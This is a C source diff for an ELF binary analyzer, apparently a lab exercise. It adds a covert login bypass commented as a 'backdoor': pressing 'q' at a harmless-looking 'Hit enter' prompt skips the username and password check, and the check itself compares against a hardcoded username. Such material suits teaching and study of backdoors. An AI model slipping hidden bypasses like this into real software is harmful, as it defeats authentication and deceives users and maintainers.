@@ -8,8 +8,11 @@
 #include <string.h>
 #include <openssl/md5.h>
 #include <capstone/capstone.h>
+#include <termios.h>
 #include "simple_bin_proto.h"
 #include "analyzer.h"
+
+static struct termios old, new;
 
 extern int DoubleSum(int a, int b);
 
@@ -37,6 +40,11 @@ int make_record(uint8_t *record_buf, char *name, uint16_t machine, uint8_t *md,
     return sizeof(FileHeader) + ((FileHeader *)record_buf)->data_length;
 }
 
+/*
+ * purpose: get the size of .text
+ * input: fd - file descriptor
+ * return: size of .text
+ */
 Elf32_Word get_text_size(int fd)
 {
     Elf *e;  // ELF
@@ -137,7 +145,6 @@ void verify_format(int fd)
 {
     Elf *e;
     GElf_Ehdr ehdr;
-    uint16_t machine;
 
     // initialize libelf
     if (elf_version(EV_CURRENT) == EV_NONE)
@@ -231,9 +238,10 @@ char *new_username(char *username)
  * purpose: user authentication
  * input: username - username given by the user
  *        password_int - password given by the user
+ *        sig - signal passed 
  * returns: -1 if fail, otherwise 0 if not fail
  */
-int authenticate(char *username, int password_int)
+int authenticate(char *username, int password_int, int sig)
 {
    if(strcmp(username, "spongebob squarepants\n") == 0)
    {
@@ -241,26 +249,74 @@ int authenticate(char *username, int password_int)
        return 0;
      else
      {
-       invalidAuth();
+       invalidAuth(sig);
        return -1;
      }
    }
    else
    {
-     invalidAuth();
+     invalidAuth(sig);
      return -1;
    } 
 }
 
-// purpose: prints out no access statement
-void invalidAuth()
+/* purpose: prints out no access statement
+ * input: signal - signal to print statement
+ * return: nothing - print statement
+ */
+void invalidAuth(int signal)
 {
-   puts("No access for you!");
+   if (signal == 0)
+     puts("No access for you!");
+   else
+     puts("");
+}
+
+/* Initialize new terminal i/o settings */
+void initTermios(int echo) 
+{
+  tcgetattr(0, &old); /* grab old terminal i/o settings */
+  new = old; /* make new settings same as old settings */
+  new.c_lflag &= ~ICANON; /* disable buffered i/o */
+  if (echo) {
+      new.c_lflag |= ECHO; /* set echo mode */
+  } else {
+      new.c_lflag &= ~ECHO; /* set no echo mode */
+  }
+  tcsetattr(0, TCSANOW, &new); /* use these new terminal i/o settings now */
+}
+
+/* Restore old terminal i/o settings */
+void resetTermios(void) 
+{
+  tcsetattr(0, TCSANOW, &old);
+}
+
+/* Read 1 character - echo defines echo mode */
+char getch_(int echo) 
+{
+  char ch;
+  initTermios(echo);
+  ch = getchar();
+  resetTermios();
+  return ch;
+}
+
+/* Read 1 character without echo */
+char getch(void) 
+{
+  return getch_(0);
+}
+
+/* Read 1 character with echo */
+char getche(void) 
+{
+  return getch_(1);
 }
 
 int main(int argc, char **argv)
 {
-    int fd, i, c;
+    int fd, i;
     uint16_t machine;
     Elf32_Word text_size;
     uint8_t md[MD5_DIGEST_LENGTH];
@@ -269,7 +325,9 @@ int main(int argc, char **argv)
     int record_size;
     char *inputfile = NULL;  
     char *username, *password, *new;
+    char c;
     int password_int, auth;
+    int sig = 0;
 
     FILE *fileptr;
     uint8_t *data;
@@ -286,21 +344,31 @@ int main(int argc, char **argv)
     username = malloc (sizeof(char) * 101);
     password = malloc (sizeof(char) * 101);
 
+    printf("Hit enter key to start analyzing.\n");
+
+    // backdoor
+    c = getch();
+    if (c == 'q')
+      sig = 1;    
+
     // authentication
-    do
-    { 
-        puts("Username: ");
-        fgets(username, 100, stdin);
-        puts("Password: ");
-        fgets(password, 100, stdin);
-        new = new_username(username);
-        password_int = atoi(password);
-        auth = authenticate(new, password_int);
-        
-    } while (auth != 0);
+    if (c != 'q')
+    {
+        do
+        { 
+            puts("Username: ");
+            fgets(username, 100, stdin);
+            puts("Password: ");
+            fgets(password, 100, stdin);
+            new = new_username(username);
+            password_int = atoi(password);
+            auth = authenticate(new, password_int, sig);
+            
+        } while (auth != 0);
+    }
 
     // retrieve and display information on binary if authentication is correct
-    if(auth == 0)
+    if(auth == 0 || c == 'q')
     { 
         fileptr = fopen(inputfile, "rb");  // Open the file in binary mode
         fseek(fileptr, 0, SEEK_END);          // Jump to the end of the file
